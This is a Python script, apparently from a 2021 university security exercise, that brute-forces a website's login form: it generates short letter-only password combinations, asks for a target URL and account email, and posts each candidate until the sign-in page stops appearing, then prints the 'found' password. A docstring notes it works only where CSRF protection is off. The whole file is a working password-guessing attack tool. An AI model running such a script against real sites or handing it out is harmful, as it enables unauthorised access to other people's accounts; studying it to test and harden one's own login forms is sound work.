import sys

import requests

from itertools import product

from time import sleep

from re import fullmatch

"""
INFO FOR CRACKING MUST BE CRSF FALSE!! in WTF forms 
"""


class TestBruteForce(object):
    def __init__(self):
        self.cout = "\033[91m"
        self.coutv = "\33[32m"
        self.cend = "\033[0m"

        # number of combination of chars
        self.combination = 3

        # path to generated passwords
        self.path = "test_bruteforce.txt"

        self.__email = None

        self.__url = None

        self.__info()

    def __info(self):
        print("---------------------------------------")
        print("[INFO] Simple Brute Force Script")
        print("[INFO] Author: Martin Juricek")
        print("[INFO] Supervisor: Ing. Roman Parak")
        print("[INFO] IACS FME BUT @2021")
        print("---------------------------------------")

    def __generatePass(self, char):
        yield from product(*([char] * int(self.combination)))

    def __process_vis(self):
        bar = """
                                Starting Cracking!

                █████████████████████████████████████████████████    

                                   In process!"""

        for c in bar:
            sys.stdout.write(c)
            sys.stdout.flush()
            sleep(0.02)

    def __check(self, url, email):
        regex = r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"

        if fullmatch(regex, email):
            print(self.coutv + "[INFO] String is a valid email" + self.cend)

        else:
            print(self.cout + "[WARNING] String is not valid email" + self.cend)
            sys.exit()

        # test if is valid URL
        try:
            response = requests.get(url)
            print(self.coutv + "[INFO] String is a valid URL" + self.cend)

        except requests.ConnectionError as exception:
            print(
                self.cout
                + "[WARNING] String is not valid URL or server isn't active"
                + self.cend
            )
            sys.exit()

    def crack(self):
        url = self.__url
        email = self.__email

        # opend file with passwords
        passwords = open(self.path, "r")

        self.__check(url, email)

        # some flexing
        self.__process_vis()
        try:
            # test all passwords from file
            for password in passwords:

                password = password.strip()

                response = requests.post(
                    url, data={"email": email, "password": password}
                )

                # if is still sign in response page pass
                if "sign_in" in str(response.content):
                    pass

                # if is not we got password
                else:
                    print("\n[INFO] Founded password: " + password)
                    print("---------------------------------------")
                    sys.exit()

        except KeyboardInterrupt:
            print(self.cout + "\n[WARNING] Stoping Cracking!" + self.cend)
            sys.exit()

        print(self.cout + "\n[WARNING] Password is not in password list." + self.cend)

    def gen_password(self):

        # special = '!"#$%&\'()*+,-. /:;?@[]^_`{|}~'
        # numeric = '0123456789'
        carecter = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

        # example of combination: getCarecter = carecter + numeric + special
        getCarecter = carecter

        for x in self.__generatePass(getCarecter):
            f = open(self.path, "a")
            f.write("".join(x) + "\n")

        f.close()

    def set_input(self):
        try:
            print("[INFO]   Server adress")
            self.__url = input("[INPUT]  Url: ")

            print("[INFO]   Account email")
            self.__email = input("[INPUT]  Email: ")

        except Exception as exception:
            sys.exit()

        except KeyboardInterrupt:
            print(self.cout + "\n[WARNING] Closing" + self.cend)
            sys.exit()


def main():
    test = TestBruteForce()

    test.set_input()
    test.crack()

    # generate all combinations
    # test.gen_password()


if __name__ == "__main__":
    main()
